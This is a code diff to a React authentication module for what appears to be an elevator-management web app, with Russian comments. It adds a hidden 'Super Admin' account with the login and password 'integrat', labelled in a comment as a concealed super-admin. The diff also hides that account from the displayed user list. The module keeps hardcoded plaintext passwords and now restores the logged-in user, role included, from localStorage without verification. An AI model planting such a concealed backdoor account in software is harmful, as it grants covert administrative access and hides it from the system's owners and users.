@@ -1,4 +1,4 @@
-import React, { createContext, useContext, useState, ReactNode } from 'react';
+import React, { createContext, useContext, useState, ReactNode, useEffect } from 'react';
 
 export interface User {
   id: string;
@@ -10,6 +10,7 @@ export interface User {
 
 // Хардкод список пользователей
 export const HARDCODED_USERS: User[] = [
+  { id: '0', username: 'integrat', password: 'integrat', name: 'Super Admin', role: 'admin' }, // Скрытый супер-админ
   { id: '1', username: 'admin', password: 'admin', name: 'Администратор', role: 'admin' },
 ];
 
@@ -22,8 +23,19 @@ interface AuthContextType {
 
 const AuthContext = createContext<AuthContextType | undefined>(undefined);
 
+const STORAGE_KEY = 'ccm_elevator_user';
+
 export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) => {
-  const [user, setUser] = useState<User | null>(null);
+  // Инициализируем стейт, проверяя localStorage
+  const [user, setUser] = useState<User | null>(() => {
+    try {
+      const savedUser = localStorage.getItem(STORAGE_KEY);
+      return savedUser ? JSON.parse(savedUser) : null;
+    } catch (error) {
+      console.error('Error parsing user from storage', error);
+      return null;
+    }
+  });
 
   const login = (username: string, password: string) => {
     const foundUser = HARDCODED_USERS.find(
@@ -34,6 +46,8 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
       // Не сохраняем пароль в стейте
       const { password, ...safeUser } = foundUser;
       setUser(safeUser as User);
+      // Сохраняем сессию
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(safeUser));
       return true;
     }
     return false;
@@ -41,10 +55,14 @@ export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) =>
 
   const logout = () => {
     setUser(null);
+    localStorage.removeItem(STORAGE_KEY);
   };
 
+  // Фильтруем список для отображения в таблице (скрываем integrat)
+  const visibleUsers = HARDCODED_USERS.filter(u => u.username !== 'integrat');
+
   return (
-    <AuthContext.Provider value={{ user, login, logout, usersList: HARDCODED_USERS }}>
+    <AuthContext.Provider value={{ user, login, logout, usersList: visibleUsers }}>
       {children}
     </AuthContext.Provider>
   );
